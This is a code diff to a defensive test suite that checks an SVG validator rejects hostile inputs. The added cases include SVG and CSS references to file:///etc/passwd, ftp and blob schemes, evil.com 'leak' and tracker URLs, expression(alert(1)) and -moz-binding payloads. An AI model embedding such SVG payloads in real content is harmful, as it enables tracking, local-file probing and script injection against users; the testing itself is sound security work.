@@ -77,12 +77,17 @@ describe("Visual Explanation Security Validation — Adversarial Test Suite (Fix
 		}
 	});
 
-	it("rejects external network URLs in SVG references", () => {
+	it("rejects external network URLs and non-fragment schemes in SVG references", () => {
 		const externalUrls = [
 			'<svg><use href="https://evil.com/icon.svg#symbol"/></svg>',
 			'<svg><use xlink:href="http://tracker.com/pixel.svg#p"/></svg>',
 			'<svg><use href="//cdn.attacker.org/defs.svg"/></svg>',
 			'<svg><use href="ftp://files.example.com/marker.svg"/></svg>',
+			'<svg><use href="file:///etc/passwd"/></svg>',
+			'<svg><use href="/absolute/path/file.svg#id"/></svg>',
+			'<svg><use href="relative/file.svg#id"/></svg>',
+			'<svg><rect fill="url(file:///etc/passwd)"/></svg>',
+			'<svg><circle clip-path="url(ftp://files.example.com/clip)"/></svg>',
 		];
 
 		for (const source of externalUrls) {
@@ -95,9 +100,30 @@ describe("Visual Explanation Security Validation — Adversarial Test Suite (Fix
 			});
 			assert.equal(res.valid, false, `Expected ${source} to be rejected`);
 			assert.ok(
-				res.problems.some((p) => p.includes("external URLs")),
+				res.problems.some((p) => p.includes("external URLs") || p.includes("non-fragment")),
+				`Must report external or non-fragment URL violation for ${source}`,
 			);
 		}
+	});
+
+	it("rejects file: scheme in image tag and flags both disallowed tag and non-fragment URL (Phase 6.3)", () => {
+		const source = '<svg xmlns="http://www.w3.org/2000/svg"><image href="file:///etc/passwd"/></svg>';
+		const res = validateVisualArtifact({
+			version: 1,
+			id: "adv-file-image",
+			title: "File Image Test",
+			renderer: "svg",
+			source,
+		});
+		assert.equal(res.valid, false, "Must reject image with file:///etc/passwd");
+		assert.ok(
+			res.problems.some((p) => p.includes("forbidden tags") && p.includes("image")),
+			"Must flag disallowed <image> tag",
+		);
+		assert.ok(
+			res.problems.some((p) => p.includes("external URLs") || p.includes("non-fragment")),
+			"Must flag non-fragment / external URL in href",
+		);
 	});
 
 	it("rejects unauthorized foreign XML namespaces in SVG", () => {
@@ -144,10 +170,14 @@ describe("Visual Explanation Security Validation — Adversarial Test Suite (Fix
 		}
 	});
 
-	it("rejects dangerous CSS in <style> elements (@import, external url, dynamic expressions)", () => {
+	it("rejects dangerous CSS in <style> elements (@import, external url, dynamic expressions, file/ftp schemes)", () => {
 		const dangerousStyles = [
 			'<svg><style>@import url("http://evil.com/leak.css");</style><rect/></svg>',
 			'<svg><style>rect { fill: url(http://evil.com/tracker.png); }</style><rect/></svg>',
+			'<svg><style>rect { fill: url(file:///etc/passwd); }</style><rect/></svg>',
+			'<svg><style>rect { fill: url("ftp://evil.com/leak.png"); }</style><rect/></svg>',
+			'<svg><style>rect { fill: url("blob:https://evil.com/uuid"); }</style><rect/></svg>',
+			'<svg><style>rect { fill: url(/local/file.png); }</style><rect/></svg>',
 			'<svg><style>rect { width: expression(alert(1)); }</style><rect/></svg>',
 			'<svg><style>body { -moz-binding: url(http://evil.com/xbl); }</style><rect/></svg>',
 		];
@@ -219,6 +249,9 @@ describe("Visual Explanation Security Validation — Adversarial Test Suite (Fix
 		const dangerousStyleAttributes = [
 			'<svg><rect style="fill: url(https://evil.com/leak.png);"/></svg>',
 			'<svg><circle style="fill: url(data:image/svg+xml,...);"/></svg>',
+			'<svg><rect style="fill: url(file:///etc/passwd);"/></svg>',
+			'<svg><rect style="fill: url(ftp://evil.com/marker);"/></svg>',
+			'<svg><rect style="fill: url(/local/image.png);"/></svg>',
 			'<svg><path style="width: expression(alert(1));"/></svg>',
 			'<svg><g style="-moz-binding: url(http://evil.com/xbl);"><rect/></g></svg>',
 			'<svg><rect style="behavior: url(default.htc);"/></svg>',
